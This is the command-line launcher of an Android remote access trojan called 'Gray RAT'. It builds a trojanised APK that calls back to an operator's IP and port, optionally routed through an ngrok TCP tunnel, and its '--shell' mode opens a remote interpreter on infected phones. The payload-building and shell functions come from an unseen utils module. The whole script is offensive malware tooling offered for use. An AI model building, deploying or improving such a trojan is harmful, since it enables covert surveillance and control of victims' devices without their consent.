#!/usr/bin/python

import argparse
import sys
import platform
import socket

# local utils
from utils import *

# Rich for banner and messages
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from pyfiglet import figlet_format

# pyngrok
try:
    from pyngrok import ngrok, conf
except ImportError:
    console = Console()
    console.print("[bold red][ERROR][/bold red] pyngrok not found!")
    console.print("[bold yellow][INFO][/bold yellow] Run: pip3 install -r requirements.txt")
    sys.exit(1)

console = Console()

# ---------------- Banner ----------------
def gray_rat_banner():
    title_ascii = figlet_format("GRAY RAT", font="bloody", width=120)
    title_text = Text(title_ascii, style="bold red")
    subtitle = Text("Android RAT (Remote Access Trojan) - For Android", style="bold white on red", justify="center")
    credits = Text("Credits: Karma", style="bold green", justify="center")
    recoded = Text("Coded by: Subir (Gray Code)", style="bold cyan", justify="center")

    console.print(Panel.fit(
        title_text,
        border_style="red",
        padding=(1,4),
        title="🐀 Gray RAT 🐀",
        subtitle="Remote Access Trojan"
    ))

    console.print(subtitle)
    console.print(credits)
    console.print(recoded)
    console.print()  # blank line

# ---------------- Main ----------------
clearDirec()
gray_rat_banner()  # banner prints only once at start

parser = argparse.ArgumentParser(
    usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]"
)
parser.add_argument("--build", help="For Building the apk", action="store_true")
parser.add_argument("--shell", help="For getting the Interpreter", action="store_true")
parser.add_argument("--ngrok", help="For using ngrok", action="store_true")
parser.add_argument("-i", "--ip", metavar="<IP>", type=str, help="Enter the IP")
parser.add_argument("-p", "--port", metavar="<Port>", type=str, help="Enter the Port")
parser.add_argument("-o", "--output", metavar="<Apk Name>", type=str, help="Enter the apk Name")
parser.add_argument("-icon", "--icon", help="Visible Icon", action="store_true")
args = parser.parse_args()

# ---------------- Show help if no args ----------------
if len(sys.argv) == 1:
    parser.print_help()  # show usage info
    sys.exit(0)

# ---------------- Python version warning ----------------
version = float(platform.python_version()[:3])
if version < 3.6 or version > 3.8:
    console.print(f"[bold yellow][WARNING][/bold yellow] Python version {platform.python_version()} detected. Recommended: 3.6 - 3.8")

# ---------------- Build Mode ----------------
if args.build:
    port_ = args.port
    icon = True if args.icon else None

    if args.ngrok:
        conf.get_default().monitor_thread = False
        port = 8000 if not port_ else port_
        tcp_tunnel = ngrok.connect(port, "tcp")
        ngrok_process = ngrok.get_ngrok_process()
        domain, port = tcp_tunnel.public_url[6:].split(":")
        ip = socket.gethostbyname(domain)
        console.print(f"[bold green][INFO][/bold green] Tunnel_IP: {ip} PORT: {port}")
        build(ip, port, args.output, True, port_, icon)

    else:
        if args.ip and args.port:
            build(args.ip, port_, args.output, False, None, icon)
        else:
            console.print("[bold red][ERROR][/bold red] Arguments Missing: --ip and --port required for non-ngrok build")

# ---------------- Shell Mode ----------------
if args.shell:
    if args.ip and args.port:
        get_shell(args.ip, args.port)
    else:
        console.print("[bold red][ERROR][/bold red] Arguments Missing: --ip and --port required for shell mode")
